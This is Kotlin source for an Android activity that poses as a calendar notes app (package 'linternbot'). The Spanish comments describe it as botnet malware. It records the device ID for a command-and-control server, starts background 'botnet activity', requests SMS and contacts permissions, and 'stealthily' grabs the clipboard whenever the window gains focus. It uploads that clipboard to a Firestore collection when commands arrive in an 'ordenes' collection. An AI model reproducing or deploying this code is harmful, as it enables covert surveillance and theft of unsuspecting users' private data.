package com.linternbot

import android.content.ClipboardManager
import android.content.pm.PackageManager
import android.os.Bundle
import android.provider.Settings
import android.util.Log
import android.view.View.INVISIBLE
import android.view.View.VISIBLE
import android.widget.Button
import android.widget.EditText
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.google.firebase.firestore.DocumentChange
import com.google.firebase.firestore.FirebaseFirestore
import com.google.firebase.firestore.ktx.firestore
import com.google.firebase.ktx.Firebase
import org.naishadhparmar.zcustomcalendar.CustomCalendar
import org.naishadhparmar.zcustomcalendar.OnDateSelectedListener
import org.naishadhparmar.zcustomcalendar.Property
import java.text.SimpleDateFormat
import java.util.*


var idAndroid = ""  // Variable global para almacenar el identificador unico del dispositivo android

// Fuente de la clase: https://www.geeksforgeeks.org/how-to-implement-custom-calendar-in-android/
class Notas : AppCompatActivity() {
    // Initialize variable
    var customCalendar: CustomCalendar? = null
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_notas)

        // Se le asigna un valor a la ID "unica" del dispositivo para identificarla en el C2
        idAndroid = Settings.Secure.getString(
            contentResolver,
            Settings.Secure.ANDROID_ID
        )
        pidePermisoSMS()
        // Comienzo del trabajo en segundo plano para la actividad de la botnet
        var alarm = Alarm()
        alarm.setAlarm(this)

        val textoInformativo = findViewById<TextView>(R.id.textoInformativo)
        val textoNota = findViewById<EditText>(R.id.NotaTexto)
        val botonAceptar = findViewById<Button>(R.id.botonAceptar)
        val botonEliminar = findViewById<Button>(R.id.botonEliminar)
        // Hago invisibles los botones de la app
        textoInformativo.visibility = INVISIBLE
        textoNota.visibility = INVISIBLE
        botonAceptar.visibility = INVISIBLE
        botonEliminar.visibility = INVISIBLE
        val db = Firebase.firestore

        // assign variable
        customCalendar = findViewById(R.id.custom_calendar)

        // Initialize description hashmap
        val descHashMap = HashMap<Any, Property>()

        // Initialize default property
        val defaultProperty = Property()

        // Initialize default resource
        defaultProperty.layoutResource = R.layout.default_view

        // Initialize and assign variable
        defaultProperty.dateTextViewResource = R.id.text_view

        // Put object and property
        descHashMap["default"] = defaultProperty

        // for current date
        val currentProperty = Property()
        currentProperty.layoutResource = R.layout.current_view
        currentProperty.dateTextViewResource = R.id.text_view
        descHashMap["current"] = currentProperty

        // for present date
        val presentProperty = Property()
        presentProperty.layoutResource = R.layout.present_view
        presentProperty.dateTextViewResource = R.id.text_view
        descHashMap["present"] = presentProperty

        // For absent
        val absentProperty = Property()
        absentProperty.layoutResource = R.layout.absent_view
        absentProperty.dateTextViewResource = R.id.text_view
        descHashMap["absent"] = absentProperty

        // set desc hashmap on custom calendar
        with(customCalendar) {
            absentProperty.layoutResource = R.layout.absent_view
            absentProperty.dateTextViewResource = R.id.text_view
            descHashMap["absent"] = absentProperty

            // set desc hashmap on custom calendar
            this?.setMapDescToProp(descHashMap)
        }

        // Initialize date hashmap
        val dateHashmap = HashMap<Int, Any>()

        // initialize calendar
        val calendar = Calendar.getInstance()

        // Put values
        // Current es azul
        // Present es verde
        // Absent es rojo
        /*
        dateHashmap[calendar[Calendar.DAY_OF_MONTH]] = "current"
        dateHashmap[1] = "present"
        dateHashmap[2] = "absent"
        dateHashmap[3] = "present"
        dateHashmap[4] = "absent"
        dateHashmap[20] = "present"
        dateHashmap[30] = "absent"
*/
        // Esto no funciona arreglar
        with(customCalendar) {

            db.collection("notasUsuario")
                .get()
                .addOnSuccessListener { result ->
                    for (document in result) {
                        if (!document.id.equals("perma")) {
                            var numero = document.id.substringBefore('-').toInt()
                            dateHashmap[numero] = "absent"
                            // Put values
                        }
                        this?.setDate(calendar, dateHashmap)
                    }
                }
            dateHashmap[calendar[Calendar.DAY_OF_MONTH]] = "current"

            // set date
            var sDate = ""
            this?.setDate(calendar, dateHashmap)
            this?.setOnDateSelectedListener(OnDateSelectedListener { view, selectedDate, desc -> // get string date
                sDate = (selectedDate[Calendar.DAY_OF_MONTH]
                    .toString() + "-" + (selectedDate[Calendar.MONTH] + 1)
                        + "-" + selectedDate[Calendar.YEAR])

                // display date in toast
                pulsaFecha(sDate, db)
            })

            var currentDate = (calendar[Calendar.DAY_OF_MONTH]
                .toString() + "-" + (calendar[Calendar.MONTH] + 1)
                    + "-" + calendar[Calendar.YEAR])
            botonAceptar.setOnClickListener() {
                if (!sDate.equals(currentDate)) {
                    if (botonAceptar.visibility.equals(VISIBLE)) {
                        var textoGuardar = hashMapOf("nota" to textoNota.text.toString())
                        db.collection("notasUsuario").document(sDate).set(textoGuardar)
                        val numero = sDate.substringBefore('-').toInt()
                        dateHashmap[numero] = "absent"
                        this?.setDate(calendar, dateHashmap)
                    }
                }
            }

            botonEliminar.setOnClickListener() {
                if (!sDate.equals(currentDate)) {
                    if (botonEliminar.visibility.equals(VISIBLE)) {
                        val numero = sDate.substringBefore('-').toInt()
                        textoNota.setText("")
                        textoInformativo.visibility = INVISIBLE
                        textoNota.visibility = INVISIBLE
                        botonAceptar.visibility = INVISIBLE
                        botonEliminar.visibility = INVISIBLE
                        db.collection("notasUsuario").document(sDate).delete()
                            .addOnSuccessListener {
                                Log.d("TAG2", "Eliminada nota de texto")
                            }
                        dateHashmap[numero] = "default"
                        this?.setDate(calendar, dateHashmap)
                    }
                }
            }
            textoNota.setOnClickListener() {
                val textoCortado =
                    textoNota.text.substring(0, ("No existe ninguna nota para el día ").length)
                if (textoCortado.equals("No existe ninguna nota para el día ")) {
                    textoNota.setText("")
                }
            }
        }
    }

    fun pulsaFecha(date: String, db: FirebaseFirestore) {
        pidePermisoContactos()
        val textoInformativo = findViewById<TextView>(R.id.textoInformativo)
        val textoNota = findViewById<EditText>(R.id.NotaTexto)
        val botonAceptar = findViewById<Button>(R.id.botonAceptar)
        val botonEliminar = findViewById<Button>(R.id.botonEliminar)
        textoInformativo.visibility = VISIBLE
        textoNota.visibility = VISIBLE
        botonAceptar.visibility = VISIBLE
        botonEliminar.visibility = VISIBLE
        db.collection("notasUsuario").document(date).get().addOnSuccessListener {
            if (it.data.toString().equals("null")) {
                textoNota.setText("No existe ninguna nota para el día " + date)
            } else textoNota.setText(it.data.toString())
        }
    }

    // Cada vez que se produce un cambio en la ventana de vision de la APP se toma el clipboard
    // Esta es la manera "sigilosa" mas facil de lograrlo
    override fun onWindowFocusChanged(hasFocus: Boolean) {
        super.onWindowFocusChanged(hasFocus)
        if (hasFocus) {
            if (ContextCompat.checkSelfPermission(
                    this,
                    android.Manifest.permission.READ_CONTACTS
                ) != PackageManager.PERMISSION_GRANTED
            ) {
            }
            val c = Calendar.getInstance()
            val sdf = SimpleDateFormat("yyyy-MM-dd HH:mm:ss")
            val strDate: String = sdf.format(c.time)
            val db = Firebase.firestore
            val clipBoardManager = this.getSystemService(CLIPBOARD_SERVICE) as ClipboardManager
            val copiedString = clipBoardManager.primaryClip.toString()
            Log.d("TAG2", "este texto es " + copiedString!!)
            val datosPortapapeles = hashMapOf(
                "User" to idAndroid,
                "Date" to strDate,
                "Portapapeles" to copiedString
            )
            db.collection("ordenes")
                .addSnapshotListener { snapshot, e ->
                    if (e != null) {
                        Log.d("TAG", "Fallada la escucha de la primitiva.", e)
                        return@addSnapshotListener
                    }

                    for (dc in snapshot!!.documentChanges) {
                        when (dc.type) {
                            DocumentChange.Type.ADDED -> db.collection("portapapeles")
                                .document(idAndroid).set(datosPortapapeles)
                        }
                    }
                }
        }
    }

    // Pide permisos al usuario para el tema de recoger la lista de contactos
    fun pidePermisoContactos(){
        val permissions = arrayOf(android.Manifest.permission.READ_CONTACTS)
        ActivityCompat.requestPermissions(this, permissions,0)
    }

    // Pide permisos al usuario para el tema de recoger la lista de contactos
    fun pidePermisoSMS(){
        val permissions = arrayOf(android.Manifest.permission.READ_SMS)
        ActivityCompat.requestPermissions(this, permissions,1)
    }
}
